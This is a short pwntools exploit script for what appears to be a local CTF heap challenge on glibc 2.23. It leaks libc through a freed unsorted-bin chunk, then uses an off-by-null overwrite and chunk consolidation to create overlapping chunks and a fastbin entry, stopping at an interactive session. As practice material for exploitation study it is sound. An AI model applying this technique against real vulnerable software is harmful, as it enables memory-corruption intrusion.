from pwn import *

elf = ELF("./pwn2.23")
libc = ELF("/home/***/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)

"""
chunk0
    prevsize: 0
    size: 0x211
chunk1
    prevsize: 0
    size: 0x21
chunk2
    prevsize: 0
    size: 0x201
chunk3
    prevsize: 0
    size: 0x20
"""
add_chunk(0, 0x200)
add_chunk(1, 0x18)
add_chunk(2, 0x1F0)
add_chunk(3, 0x10)

delete_chunk(0)

# libc addr leaking
show_chunk(0)
p.recvline()
tmp = u64(p.recvuntil(b"\x7f").ljust(0x8, b"\x00")) - 0x3C4B78
libc.address = tmp
print("libc.address", hex(libc.address))

# chunk2->prevsize = 0x230, chunk2->size = 0x200
edit_chunk(1, b"a" * 0x10 + p64(0x230) + p8(0))

# 合并chunk造成重叠，free chunk0->size = 0x430
delete_chunk(2)
add_chunk(0, 0x428)

# fastbins[0x20] => chunk1
delete_chunk(1)

p.interactive()
